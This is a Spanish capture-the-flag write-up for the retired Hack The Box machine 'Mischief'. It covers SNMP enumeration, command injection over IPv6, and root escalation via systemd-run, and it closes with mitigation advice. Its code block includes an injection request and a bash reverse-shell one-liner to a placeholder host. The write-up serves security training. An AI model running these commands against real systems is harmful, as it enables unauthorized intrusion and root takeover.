---
machine: Mischief
os: Linux
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [linux, snmp, ipv6, command-injection, systemd-run]
---

# Mischief — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

SNMP revela una dirección IPv6 y un servicio web que solo escucha en esa interfaz. Una inyección de comandos da acceso como `www-data`; las ACL bloquean `su` y `systemd-run` permite ejecutar como root.

## Reconocimiento

```bash
nmap -Pn -sU -p161 <IP>
snmpwalk -v2c -c public <IP>
snmpwalk -v2c -c public <IP> ipAddresses
# Acceso por IPv6
curl -g -6 "http://[<IPv6>]/index.php?cmd=id"
# Escalada
systemd-run --unit=shell /bin/bash -c "id"
systemd-run --unit=root /bin/bash -c "bash -i >& /dev/tcp/<IP>/4444 0>&1"
```

## Enumeración

- SNMP accesible con cadenas del sistema.
- Servicio web en una dirección IPv6 no visible en IPv4.
- Usuario con ACL restrictivas y `systemd-run` disponible.

## Acceso inicial

`snmpwalk` extrae procesos, interfaces y la dirección IPv6. Se accede al servicio por IPv6 y se explota una inyección de comandos en un parámetro, obteniendo una shell como `www-data`.

## Escalada de privilegios

La cuenta no puede usar `su` por las ACL, pero `systemd-run` permite lanzar una unidad transitoria en un contexto con más privilegios; se ejecuta una shell y se llega a root.

## Evidencia

- `snmpwalk` con la dirección IPv6.
- Inyección de comandos y shell como `www-data`.
- `systemd-run` creando una unidad y shell de root.

## Lecciones aprendidas

- SNMP puede filtrar direcciones y servicios no visibles.
- IPv6 amplía la superficie aunque IPv4 parezca cerrado.
- Las ACL de `su` no cubren otras vías de ejecución.

## Mitigación y detección

- Restringir SNMP y cambiar las comunidades por defecto.
- Auditar servicios IPv6 y aplicar el mismo filtrado que en IPv4.
- Limitar `systemd-run` y revisar ACL y políticas de exec.

## Referencias

- [0xdf — Mischief](https://0xdf.gitlab.io/2019/01/05/htb-mischief.html)
- [Net-SNMP — snmpwalk](http://www.net-snmp.org/docs/man/snmpwalk.html)
- [Hack The Box — Mischief](https://app.hackthebox.com/machines/mischief)
